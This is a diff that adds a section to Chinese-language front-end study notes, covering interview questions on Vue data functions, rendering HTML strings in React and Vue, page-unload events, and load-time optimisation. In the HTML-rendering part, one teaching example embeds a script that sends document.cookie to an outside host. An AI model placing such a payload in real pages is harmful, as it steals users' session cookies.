@@ -3015,3 +3015,43 @@
     * 技术
         * 数据格式化
         * 与后端沟通数据格式
+
+## day7-5
+
+### 面试题
+* Vue组件中的data配置为什么是函数
+* React如何让包含html代码的数据显示到页面
+    * 富文本编辑器
+    ```html
+        <input />
+        <textarea />
+        const content = '<div>asdfjlsadkjf<script>location.href="http://www.laoxie.com?cookie="+document.cookie</script></div>'
+        <div>{{content}}</div>
+
+        <!--vue-->
+        <div v-html="content"></div>
+        <!--react-->
+        <div dangerouslySetInnerHTML={{__html:content}}></div>
+
+        <!-- 原生js -->
+        div.innerText = content;
+        div.innerHTML = content;
+    ```
+* 如何监听用户关闭页面的操作
+    * onload
+    * onunload
+    * onbeforeunload
+
+* 提高查看文档的能力
+    * 需求文档
+    * 技术文档
+
+### 知识点
+* 项目优化
+    * 按需加载
+        > antd按需加载
+        ```js
+            import {Button} from 'antd'
+        ```
+    * 路由懒加载
+        > 优化首页访问速度，只有用户访问到某个页面时才加载这个路由
